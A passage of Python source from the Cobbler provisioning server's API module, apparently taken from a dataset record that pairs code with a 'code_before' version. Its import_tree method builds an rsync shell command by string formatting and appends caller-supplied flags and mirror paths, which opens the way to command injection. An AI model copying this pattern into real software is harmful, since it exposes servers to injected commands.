   :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.images().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_mgmtclass(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a management class via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.mgmtclasses().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_package(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a package via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.packages().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_file(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a file via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.files().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    def find_menu(self, name: str = \"\", return_list=False, no_errors=False, **kargs):\n        \"\"\"\n        Find a menu via a name or keys specified in the ``**kargs``.\n\n        :param name: The name to search for.\n        :param return_list: If only the first result or all results should be returned.\n        :param no_errors: Silence some errors which would raise if this turned to False.\n        :param kargs: Additional key-value pairs which may help in finding the desired objects.\n        :return: A single object or a list of all search results.\n        \"\"\"\n        return self._collection_mgr.menus().find(name=name, return_list=return_list, no_errors=no_errors, **kargs)\n\n    # ==========================================================================\n\n    def __since(self, mtime: float, collector, collapse: bool = False) -> list:\n        \"\"\"\n        Called by get_*_since functions. This is an internal part of Cobbler.\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collector: The list of objects to filter after mtime.\n        :param collapse: Whether the object should be collapsed to a dict or not. If not the item objects are used for\n                         the list.\n        :return: The list of objects which are newer then the given timestamp.\n        \"\"\"\n        results1 = collector()\n        results2 = []\n        for x in results1:\n            if x.mtime == 0 or x.mtime >= mtime:\n                if not collapse:\n                    results2.append(x)\n                else:\n                    results2.append(x.to_dict())\n        return results2\n\n    def get_distros_since(self, mtime: float, collapse: bool = False):\n        \"\"\"\n        Returns distros modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: collapse=True specifies returning a dict instead of objects.\n        :return: The list of distros which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.distros, collapse=collapse)\n\n    def get_profiles_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Returns profiles modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of profiles which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.profiles, collapse=collapse)\n\n    def get_systems_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return systems modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of systems which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.systems, collapse=collapse)\n\n    def get_repos_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return repositories modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of repositories which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.repos, collapse=collapse)\n\n    def get_images_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return images modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of images which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.images, collapse=collapse)\n\n    def get_mgmtclasses_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return management classes modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of management classes which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.mgmtclasses, collapse=collapse)\n\n    def get_packages_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return packages modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of packages which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.packages, collapse=collapse)\n\n    def get_files_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return files modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of files which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.files, collapse=collapse)\n\n    def get_menus_since(self, mtime: float, collapse=False) -> list:\n        \"\"\"\n        Return files modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of files which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.menus, collapse=collapse)\n\n    # ==========================================================================\n\n    def get_signatures(self) -> dict:\n        \"\"\"\n        This returns the local signature cache.\n\n        :return: The dict containing all signatures.\n        \"\"\"\n        return utils.SIGNATURE_CACHE\n\n    def signature_update(self):\n        \"\"\"\n        Update all signatures from the URL specified in the settings.\n        \"\"\"\n        try:\n            url = self.settings().signature_url\n            dlmgr = download_manager.DownloadManager(self._collection_mgr)\n            # write temp json file\n            tmpfile = tempfile.NamedTemporaryFile()\n            sigjson = dlmgr.urlread(url)\n            tmpfile.write(sigjson.text.encode())\n            tmpfile.flush()\n            self.logger.debug(\"Successfully got file from %s\" % self.settings().signature_url)\n            # test the import without caching it\n            try:\n                utils.load_signatures(tmpfile.name, cache=False)\n            except:\n                self.logger.error(\"Downloaded signatures failed test load (tempfile = %s)\", tmpfile.name)\n\n            # rewrite the real signature file and import it for real\n            f = open(self.settings().signature_path, \"w\")\n            f.write(sigjson.text)\n            f.close()\n\n            utils.load_signatures(self.settings().signature_path)\n        except:\n            utils.log_exc()\n\n    # ==========================================================================\n\n    def dump_vars(self, obj, formatted_output: bool = False):\n        \"\"\"\n        Dump all known variables related to that object.\n\n        :param obj: The object for which the variables should be dumped.\n        :param formatted_output: If True the values will align in one column and be pretty printed for cli example.\n        :return: A dictionary with all the information which could be collected.\n        \"\"\"\n        return obj.dump_vars(formatted_output)\n\n    # ==========================================================================\n\n    def auto_add_repos(self):\n        \"\"\"\n        Import any repos this server knows about and mirror them. Run ``cobbler reposync`` to apply the changes.\n        Credit: Seth Vidal.\n\n        :raises ImportError\n        \"\"\"\n        self.log(\"auto_add_repos\")\n        try:\n            import dnf\n        except:\n            raise ImportError(\"dnf is not installed\")\n\n        base = dnf.Base()\n        base.read_all_repos()\n        basearch = base.conf.substitutions[\"basearch\"]\n\n        for repository in base.repos.iter_enabled():\n            auto_name = repository.id + '-' + base.conf.releasever + '-' + basearch\n\n            if self.find_repo(auto_name) is None:\n                cobbler_repo = self.new_repo()\n                cobbler_repo.name = auto_name\n                cobbler_repo.breed = enums.RepoBreeds.YUM\n                cobbler_repo.arch = basearch\n                cobbler_repo.comment = repository.name\n                baseurl = repository.baseurl\n                metalink = repository.metalink\n                mirrorlist = repository.mirrorlist\n\n                if metalink is not None:\n                    mirror = metalink\n                    mirror_type = enums.MirrorType.METALINK\n                elif mirrorlist is not None:\n                    mirror = mirrorlist\n                    mirror_type = enums.MirrorType.MIRRORLIST\n                elif len(baseurl) > 0:\n                    mirror = baseurl[0]\n                    mirror_type = enums.MirrorType.BASEURL\n                else:\n                    mirror = \"\"\n                    mirror_type = enums.MirrorType.NONE\n\n                cobbler_repo.mirror = mirror\n                cobbler_repo.mirror_type = mirror_type\n                self.log(\"auto repo adding: %s\" % auto_name)\n                self.add_repo(cobbler_repo)\n            else:\n                self.log(\"auto repo adding: %s - exists\" % auto_name)\n\n    # ==========================================================================\n\n    def get_repo_config_for_profile(self, obj) -> str:\n        \"\"\"\n        Get the repository configuration for the specified profile\n\n        :param obj: The profile to return the configuration for.\n        :return: The repository configuration as a string.\n        \"\"\"\n        return self.yumgen.get_yum_config(obj, True)\n\n    def get_repo_config_for_system(self, obj) -> str:\n        \"\"\"\n        Get the repository configuration for the specified system.\n\n        :param obj: The system to return the configuration for.\n        :return: The repository configuration as a string.\n        \"\"\"\n        return self.yumgen.get_yum_config(obj, False)\n\n    # ==========================================================================\n\n    def get_template_file_for_profile(self, obj, path) -> str:\n        \"\"\"\n        Get the template for the specified profile.\n\n        :param obj: The object which is related to that template.\n        :param path: The path to the template.\n        :return: The template as in its string representation.\n        \"\"\"\n        template_results = self.tftpgen.write_templates(obj, False, path)\n        if path in template_results:\n            return template_results[path]\n        else:\n            return \"# template path not found for specified profile\"\n\n    def get_template_file_for_system(self, obj, path):\n        \"\"\"\n        Get the template for the specified system.\n\n        :param obj: The object which is related to that template.\n        :param path: The path to the template.\n        :return: The template as in its string representation.\n        \"\"\"\n        template_results = self.tftpgen.write_templates(obj, False, path)\n        if path in template_results:\n            return template_results[path]\n        else:\n            return \"# template path not found for specified system\"\n\n    # ==========================================================================\n\n    def generate_ipxe(self, profile: str, image: str, system: str) -> str:\n        \"\"\"\n        Generate the ipxe configuration files. The system wins over the profile. Profile and System win over Image.\n\n        :param profile: The profile to return the configuration for.\n        :param image: The image to return the configuration for.\n        :param system: The system to return the configuration for.\n        :return: The generated configuration file.\n        \"\"\"\n        self.log(\"generate_ipxe\")\n        data = \"\"\n        if profile is None and image is None and system is None:\n            boot_menu = self.tftpgen.make_pxe_menu()\n            if 'ipxe' in boot_menu:\n                data = boot_menu['ipxe']\n        elif system:\n            data = self.tftpgen.generate_ipxe(\"system\", system)\n        elif profile:\n            data = self.tftpgen.generate_ipxe(\"profile\", profile)\n        elif image:\n            data = self.tftpgen.generate_ipxe(\"image\", image)\n        return data\n\n    # ==========================================================================\n\n    def generate_bootcfg(self, profile: str, system: str) -> str:\n        \"\"\"\n        Generate a boot configuration. The system wins over the profile.\n\n        :param profile: The profile to return the configuration for.\n        :param system: The system to return the configuration for.\n        :return: The generated configuration file.\n        \"\"\"\n        self.log(\"generate_bootcfg\")\n        if system:\n            return self.tftpgen.generate_bootcfg(\"system\", system)\n        else:\n            return self.tftpgen.generate_bootcfg(\"profile\", profile)\n\n    # ==========================================================================\n\n    def generate_script(self, profile: Optional[str], system: Optional[str], name: str):\n        \"\"\"\n        Generate an autoinstall script for the specified profile or system. The system wins over the profile.\n\n        :param profile: The profile name to generate the script for.\n        :param system: The system name to generate the script for.\n        :param name: The name of the script which should be generated. Must only contain alphanumeric characters, dots\n                     and underscores.\n        :return: The generated script or an error message.\n        \"\"\"\n        self.log(\"generate_script\")\n        if system:\n            return self.tftpgen.generate_script(\"system\", system, name)\n        else:\n            return self.tftpgen.generate_script(\"profile\", profile, name)\n\n    # ==========================================================================\n\n    def check(self) -> Union[None, list]:\n        \"\"\"\n        See if all preqs for network booting are valid. This returns a list of strings containing instructions on things\n        to correct. An empty list means there is nothing to correct, but that still doesn't mean there are configuration\n        errors. This is mainly useful for human admins, who may, for instance, forget to properly set up their TFTP\n        servers for PXE, etc.\n\n        :return: None or a list of things to address.\n        \"\"\"\n        self.log(\"check\")\n        action_check = check.CobblerCheck(self._collection_mgr)\n        return action_check.run()\n\n    # ==========================================================================\n\n    def validate_autoinstall_files(self):\n        \"\"\"\n        Validate if any of the autoinstallation files are invalid and if yes report this.\n\n        \"\"\"\n        self.log(\"validate_autoinstall_files\")\n        autoinstall_mgr = autoinstall_manager.AutoInstallationManager(self._collection_mgr)\n        autoinstall_mgr.validate_autoinstall_files()\n\n    # ==========================================================================\n\n    def sync_systems(self, systems: List[str], verbose: bool = False):\n        \"\"\"\n        Take the values currently written to the configuration files in /etc, and /var, and build out the information\n        tree found in /tftpboot. Any operations done in the API that have not been saved with serialize() will NOT be\n        synchronized with this command.\n\n        :param systems: List of specified systems that needs to be synced\n        :param verbose: If the action should be just logged as needed or (if True) as much verbose as possible.\n        \"\"\"\n        self.log(\"sync_systems\")\n        if not (systems and isinstance(systems, list) and all(isinstance(sys_name, str) for sys_name in systems)):\n            raise TypeError('Systems must be a list of one or more strings.')\n        sync_obj = self.get_sync(verbose=verbose)\n        sync_obj.run_sync_systems(systems)\n\n    # ==========================================================================\n\n    def sync(self, verbose: bool = False, what: Optional[list] = None):\n        \"\"\"\n        Take the values currently written to the configuration files in /etc, and /var, and build out the information\n        tree found in /tftpboot. Any operations done in the API that have not been saved with serialize() will NOT be\n        synchronized with this command.\n\n        :param verbose: If the action should be just logged as needed or (if True) as much verbose as possible.\n        :param what:   List of strings what services to sync (e.g. dhcp and/or dns). Empty list for full sync.\n        \"\"\"\n        # Empty what: Full sync\n        if not what:\n            self.logger.info(\"syncing all\")\n            sync_obj = self.get_sync(verbose=verbose)\n            sync_obj.run()\n            return\n        # Non empty what: Specific sync\n        if not isinstance(what, list):\n            raise TypeError(\"'what' needs to be of type list!\")\n        if 'dhcp' in what:\n            self.sync_dhcp()\n        if 'dns' in what:\n            self.sync_dns()\n\n    # ==========================================================================\n\n    def sync_dns(self):\n        \"\"\"\n        Only build out the DNS configuration.\n        \"\"\"\n        if not self.settings().manage_dns:\n            self.logger.error(\"manage_dns not set\")\n            return\n        self.logger.info(\"sync_dns\")\n        dns_module = self.get_module_from_file(\n            \"dns\",\n            \"module\",\n            \"managers.bind\"\n        )\n        dns = dns_module.get_manager(self._collection_mgr)\n        dns.sync()\n\n    # ==========================================================================\n\n    def sync_dhcp(self):\n        \"\"\"\n        Only build out the DHCP configuration.\n        \"\"\"\n        if not self.settings().manage_dhcp:\n            self.logger.error(\"manage_dhcp not set\")\n            return\n        self.logger.info(\"sync_dhcp\")\n        dhcp_module = self.get_module_from_file(\n            \"dhcp\",\n            \"module\",\n            \"managers.isc\"\n        )\n        dhcp = dhcp_module.get_manager(self._collection_mgr)\n        dhcp.sync()\n\n    # ==========================================================================\n\n    def get_sync(self, verbose: bool = False):\n        \"\"\"\n        Get a Cobbler Sync object which may be executed through the call of ``obj.run()``.\n\n        :param verbose: If the action should be just logged as needed or (if True) as much verbose as possible.\n        :return: An instance of the CobblerSync class to execute the sync with.\n        \"\"\"\n        if not isinstance(verbose, bool):\n            raise TypeError(\"get_sync: verbose parameter needs to be of type bool!\")\n        dhcp = self.get_module_from_file(\n            \"dhcp\",\n            \"module\",\n            \"managers.isc\"\n        ).get_manager(self._collection_mgr)\n        dns = self.get_module_from_file(\n            \"dns\",\n            \"module\",\n            \"managers.bind\"\n        ).get_manager(self._collection_mgr)\n        tftpd = self.get_module_from_file(\n            \"tftpd\",\n            \"module\",\n            \"managers.in_tftpd\",\n        ).get_manager(self._collection_mgr)\n\n        return sync.CobblerSync(self._collection_mgr, dhcp=dhcp, dns=dns, tftpd=tftpd, verbose=verbose)\n\n    # ==========================================================================\n\n    def reposync(self, name: Optional[str] = None, tries: int = 1, nofail: bool = False):\n        \"\"\"\n        Take the contents of ``/var/lib/cobbler/repos`` and update them -- or create the initial copy if no contents\n        exist yet.\n\n        :param name: The name of the repository to run reposync for.\n        :param tries: How many tries should be executed before the action fails.\n        :param nofail: If True then the action will fail, otherwise the action will just be skipped. This respects the\n                       ``tries`` parameter.\n        \"\"\"\n        self.log(\"reposync\", [name])\n        action_reposync = reposync.RepoSync(self._collection_mgr, tries=tries, nofail=nofail)\n        action_reposync.run(name)\n\n    # ==========================================================================\n\n    def status(self, mode: str):\n        \"\"\"\n        Get the status of the current Cobbler instance.\n\n        :param mode: \"text\" or anything else. Meaning whether the output is thought for the terminal or not.\n        :return: The current status of Cobbler.\n        \"\"\"\n        statusifier = status.CobblerStatusReport(self._collection_mgr, mode)\n        return statusifier.run()\n\n    # ==========================================================================\n\n    def import_tree(self, mirror_url: str, mirror_name: str, network_root=None, autoinstall_file=None, rsync_flags=None,\n                    arch=None, breed=None, os_version=None) -> bool:\n        \"\"\"\n        Automatically import a directory tree full of distribution files.\n\n        :param mirror_url: Can be a string that represents a path, a user@host syntax for SSH, or an rsync:// address.\n                           If mirror_url is a filesystem path and mirroring is not desired, set network_root to\n                           something like \"nfs://path/to/mirror_url/root\"\n        :param mirror_name: The name of the mirror.\n        :param network_root:\n        :param autoinstall_file:\n        :param rsync_flags:\n        :param arch:\n        :param breed:\n        :param os_version:\n        \"\"\"\n        self.log(\"import_tree\", [mirror_url, mirror_name, network_root, autoinstall_file, rsync_flags])\n\n        # Both --path and --name are required arguments.\n        if mirror_url is None or not mirror_url:\n            self.log(\"import failed.  no --path specified\")\n            return False\n        if mirror_name is None or not mirror_name:\n            self.log(\"import failed.  no --name specified\")\n            return False\n\n        path = os.path.normpath(\"%s/distro_mirror/%s\" % (self.settings().webdir, mirror_name))\n        if arch is not None:\n            arch = arch.lower()\n            if arch == \"x86\":\n                # be consistent\n                arch = \"i386\"\n            if path.split(\"-\")[-1] != arch:\n                path += (\"-%s\" % arch)\n\n        # We need to mirror (copy) the files.\n        self.log(\"importing from a network location, running rsync to fetch the files first\")\n\n        utils.mkdir(path)\n\n        # Prevent rsync from creating the directory name twice if we are copying via rsync.\n\n        if not mirror_url.endswith(\"/\"):\n            mirror_url = \"%s/\" % mirror_url\n\n        if mirror_url.startswith(\"http://\") or mirror_url.startswith(\"https://\") or mirror_url.startswith(\"ftp://\") \\\n                or mirror_url.startswith(\"nfs://\"):\n            # HTTP mirrors are kind of primative. rsync is better. That's why this isn't documented in the manpage and\n            # we don't support them.\n            # TODO: how about adding recursive FTP as an option?\n            self.log(\"unsupported protocol\")\n            return False\n        else:\n            # Good, we're going to use rsync.. We don't use SSH for public mirrors and local files.\n            # Presence of user@host syntax means use SSH\n            spacer = \"\"\n            if not mirror_url.startswith(\"rsync://\") and not mirror_url.startswith(\"/\"):\n                spacer = ' -e \"ssh\" '\n            rsync_cmd = RSYNC_CMD\n            if rsync_flags:\n                rsync_cmd += \" \" + rsync_flags\n\n            # If --available-as was specified, limit the files we pull down via rsync to just those that are critical\n            # to detecting what the distro is\n            if network_root is not None:\n                rsync_cmd += \" --include-from=/etc/cobbler/import_rsync_whitelist\"\n\n            # kick off the rsync now\n            utils.run_this(rsync_cmd, (spacer, mirror_url, path))\n\n        if network_root is not None:\n            # In addition to mirroring, we're going to assume the path is available over http, ftp, and nfs, perhaps on\n            # an external filer. Scanning still requires --mirror is a filesystem path, but --available-as marks the\n            # network path. This allows users to point the path at a directory containing just the network boot files\n            # while the rest of the distro files are available somewhere else.\n\n            # Find the filesystem part of the path, after the server bits, as each distro URL needs to be calculated\n            # relative to this.\n\n            if not network_root.endswith(\"/\"):\n                network_root += \"/\"\n            valid_roots = [\"nfs://\", \"ftp://\", \"http://\", \"https://\"]\n            for valid_root in valid_roots:\n                if network_root.startswith(valid_root):\n                    break\n            else:\n                self.log(\"Network root given to --available-as must be nfs://, ftp://, http://, or https://\")\n                return False\n\n            if network_root.startswith(\"nfs://\"):\n                try:\n                    (a, b, rest) = network_root.split(\":\", 3)\n                except:\n                    self.log(\"Network root given to --available-as is missing a colon, please see the manpage example.\")\n                    return False\n\n        import_module = self.get_module_by_name(\"managers.import_signatures\") \\\n            .get_import_manager(self._collection_mgr)\n        import_module.run(path, mirror_name, network_root, autoinstall_file, arch, breed, os_version)\n        return True\n\n    # ==========================================================================\n\n    def acl_config(self, adduser: Optional[str] = None, addgroup: Optional[str] = None,\n                   removeuser: Optional[str] = None, removegroup: Optional[str] = None):\n        \"\"\"\n        Configures users/groups to run the Cobbler CLI as non-root.\n        Pass in only one option at a time. Powers ``cobbler aclconfig``.\n\n        :param adduser:\n        :param addgroup:\n        :param removeuser:\n        :param removegroup:\n        \"\"\"\n        action_acl = acl.AclConfig(self._collection_mgr)\n        action_acl.run(\n            adduser=adduser,\n            addgroup=addgroup,\n            removeuser=removeuser,\n            removegroup=removegroup\n        )\n\n    # ==========================================================================\n\n    def serialize(self):\n        \"\"\"\n        Save the cobbler_collections to disk.\n        Cobbler internal use only.\n        \"\"\"\n        self._collection_mgr.serialize()\n\n    def deserialize(self):\n        \"\"\"\n        Load cobbler_collections from disk.\n        Cobbler internal use only.\n        \"\"\"\n        return self._collection_mgr.deserialize()\n\n    # ==========================================================================\n\n    def get_module_by_name(self, module_name: str):\n        \"\"\"\n        Returns a loaded Cobbler module named 'name', if one exists, else None.\n        Cobbler internal use only.\n\n        :param module_name:\n        :return:\n        \"\"\"\n        return module_loader.get_module_by_name(module_name)\n\n    def get_module_from_file(self, section: str, name: str, fallback: Optional[str] = None):\n        \"\"\"\n        Looks in ``/etc/cobbler/modules.conf`` for a section called 'section' and a key called 'name', and then returns\n        the module that corresponds to the value of that key.\n        Cobbler internal use only.\n\n        :param section:\n        :param name:\n        :param fallback:\n        :return:\n        \"\"\"\n        return module_loader.get_module_from_file(section, name, fallback)\n\n    def get_module_name_from_file(self, section: str, name: str, fallback: Optional[str] = None):\n        \"\"\"\n        Looks up a module the same as ``get_module_from_file`` but returns the module name rather than the module\n        itself.\n\n        :param section:\n        :param name:\n        :param fallback:\n        :return:\n        \"\"\"\n        return module_loader.get_module_name(section, name, fallback)\n\n    def get_modules_in_category(self, category: str):\n        \"\"\"\n        Returns all modules in a given category, for instance \"serializer\", or \"cli\".\n        Cobbler internal use only.\n\n        :param category: The category to check.\n        :return: The list of modules.\n        \"\"\"\n        return module_loader.get_modules_in_category(category)\n\n    # ==========================================================================\n\n    def authenticate(self, user: str, password: str):\n        \"\"\"\n        (Remote) access control. This depends on the chosen authentication module.\n        Cobbler internal use only.\n\n        :param user: The username to check for authentication.\n        :param password: The password to check for authentication.\n        :return: Whether the action succeeded or not.\n        \"\"\"\n        rc = self.authn.authenticate(self, user, password)\n        self.log(\"authenticate\", [user, rc])\n        return rc\n\n    def authorize(self, user: str, resource: str, arg1=None, arg2=None):\n        \"\"\"\n        (Remote) access control. This depends on the chosen authorization module.\n        Cobbler internal use only.\n\n        :param user: The username to check for authorization.\n        :param resource: The type of resource which should be checked for access from the supplied user.\n        :param arg1: The actual resource to check for authorization.\n        :param arg2: Not known what this parameter does exactly.\n        :return: The return code of the action.\n        \"\"\"\n        rc = self.authz.authorize(self, user, resource, arg1, arg2)\n        self.log(\"authorize\", [user, resource, arg1, arg2, rc], debug=True)\n        return rc\n\n    # ==========================================================================\n\n    def build_iso(self, iso=None, profiles=None, systems=None, buildisodir=None, distro=None, standalone=None,\n                  airgapped=None, source=None, exclude_dns=None, xorrisofs_opts=None):\n        \"\"\"\n        Build an iso image which may be network bootable or not.\n\n        :param iso:\n        :param profiles:\n        :param systems:\n        :param buildisodir:\n        :param distro:\n        :param standalone:\n        :param airgapped:\n        :param source:\n        :param exclude_dns:\n        :param xorrisofs_opts:\n        \"\"\"\n        builder = buildiso.BuildIso(self._collection_mgr)\n        builder.run(\n            iso=iso, profiles=profiles, systems=systems, buildisodir=buildisodir, distro=distro, standalone=standalone,\n            airgapped=airgapped, source=source, exclude_dns=exclude_dns, xorrisofs_opts=xorrisofs_opts\n        )\n\n    # ==========================================================================\n\n    def hardlink(self):\n        \"\"\"\n        Hardlink all files where this is possible to improve performance.\n\n        :return: The return code of the subprocess call which actually hardlinks the files.\n        \"\"\"\n        linker = hardlink.HardLinker(api=self)\n        return linker.run()\n\n    # ==========================================================================\n\n    def replicate(self, cobbler_master: Optional[str] = None, port: str = \"80\", distro_patterns: str = \"\",\n                  profile_patterns: str = \"\", system_patterns: str = \"\", repo_patterns: str = \"\",\n                  image_patterns: str = \"\", mgmtclass_patterns=None, package_patterns=None, file_patterns: bool = False,\n                  prune: bool = False, omit_data: bool = False, sync_all: bool = False, use_ssl: bool = False):\n        \"\"\"\n        Pull down data/configs from a remote Cobbler server that is a master to this server.\n\n        :param cobbler_master: The hostname/URL of the other Cobbler server\n        :param port: The port to use for the replication task.\n        :param distro_patterns: The pattern of distros which should be synced.\n        :param profile_patterns: The pattern of profiles which should be synced.\n        :param system_patterns: The pattern of systems which should be synced.\n        :param repo_patterns: The pattern of repositories which should be synced.\n        :param image_patterns: The pattern of images which should be synced.\n        :param mgmtclass_patterns: The pattern of management classes which should be synced.\n        :param package_patterns: The pattern of packages which should be synced.\n        :param file_patterns: The pattern of files which should be synced.\n        :param prune: Whether the object not on the master should be removed or not.\n        :param omit_data: If the data downloaded by the current Cobbler server should be rsynced to the destination\n                          server.\n        :param sync_all: This parameter behaves similarly to a dry run argument. If True then everything will executed,\n                         if False then only some things are synced.\n        :param use_ssl: Whether SSL should be used (True) or not (False).\n        \"\"\"\n        replicator = replicate.Replicate(self._collection_mgr)\n        return replicator.run(\n            cobbler_master=cobbler_master, port=port, distro_patterns=distro_patterns,\n            profile_patterns=profile_patterns, system_patterns=system_patterns, repo_patterns=repo_patterns,\n            image_patterns=image_patterns, mgmtclass_patterns=mgmtclass_patterns, package_patterns=package_patterns,\n            file_patterns=file_patterns, prune=prune, omit_data=omit_data, sync_all=sync_all, use_ssl=use_ssl\n        )\n\n    # ==========================================================================\n\n    def report(self, report_what: Optional[str] = None, report_name: Optional[str] = None,\n               report_type: Optional[str] = None, report_fields: Optional[str] = None,\n               report_noheaders: Optional[bool] = None):\n        \"\"\"\n        Report functionality for Cobbler.\n\n        :param report_what: The object type that should be reported.\n        :param report_name: The name of the object which should be possibly reported.\n        :param report_type: May be either \"text\", \"csv\", \"mediawiki\", \"trac\" or \"doku\".\n        :param report_fields: Specify \"all\" or the fields you want to be reported.\n        :param report_noheaders: If the column headers should be included in the output or not.\n        \"\"\"\n        reporter = report.Report(self._collection_mgr)\n        return reporter.run(report_what=report_what, report_name=report_name, report_type=report_type,\n                            report_fields=report_fields, report_noheaders=report_noheaders)\n\n    # ==========================================================================\n\n    def power_system(self, system: str, power_operation: str, user: Optional[str] = None,\n                     password: Optional[str] = None):\n        \"\"\"\n        Power on / power off / get power status /reboot a system.\n\n        :param system: Cobbler system\n        :param power_operation: power operation. Valid values: on, off, reboot, status\n        :param user: power management user\n        :param password: power management password\n        :return: bool if operation was successful\n        \"\"\"\n\n        if power_operation == \"on\":\n            self.power_mgr.power_on(system, user=user, password=password)\n        elif power_operation == \"off\":\n            self.power_mgr.power_off(system, user=user, password=password)\n        elif power_operation == \"status\":\n            return self.power_mgr.get_power_status(system, user=user, password=password)\n        elif power_operation == \"reboot\":\n            self.power_mgr.reboot(system, user=user, password=password)\n        else:\n            utils.die(\"invalid power operation '%s', expected on/off/status/reboot\" % power_operation)\n        return None\n\n    # ==========================================================================\n\n    def clear_logs(self, system):\n        \"\"\"\n        Clears console and anamon logs for system\n\n        :param system: The system to clear logs of.\n        \"\"\"\n        log.LogTool(self._collection_mgr, system, self).clear()\n\n    # ==========================================================================\n\n    def get_valid_obj_boot_loaders(self, obj) -> List[str]:\n        \"\"\"\n        Return the list of valid boot loaders for the object\n\n        :param obj: The object for which the boot loaders should be looked up.\n        :return: Get a list of all valid boot loaders.\n        \"\"\"\n        return obj.supported_boot_loaders\n\n    # ==========================================================================\n\n    def create_grub_images(self):\n        \"\"\"\n        Create the GRUB installer images via this API call. It utilizes ``grub2-mkimage`` behind the curtain.\n        \"\"\"\n        action = grubimage.GrubImage(self)\n        action.run()\n", "code_before": "\"\"\"\nCopyright 2006-2009, Red Hat, Inc and Others\nMichael DeHaan <michael.dehaan AT gmail>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA\n02110-1301  USA\n\"\"\"\n\nimport logging\nimport os\nimport pathlib\nimport random\nimport tempfile\nimport threading\nfrom configparser import ConfigParser\nfrom pathlib import Path\nfrom typing import Dict, List, Optional, Union\n\nfrom cobbler.actions import status, hardlink, sync, buildiso, replicate, report, log, acl, check, reposync, grubimage\nfrom cobbler import autoinstall_manager, autoinstallgen, download_manager, enums, module_loader, power_manager\nfrom cobbler import settings, tftpgen, utils, yumgen\nfrom cobbler.cobbler_collections import manager\nfrom cobbler.items import distro, file, image, menu, mgmtclass, package, profile, repo, system\n\n# FIXME: add --quiet depending on if not --verbose?\nRSYNC_CMD = \"rsync -a %s '%s' %s --progress\"\n\n\n# 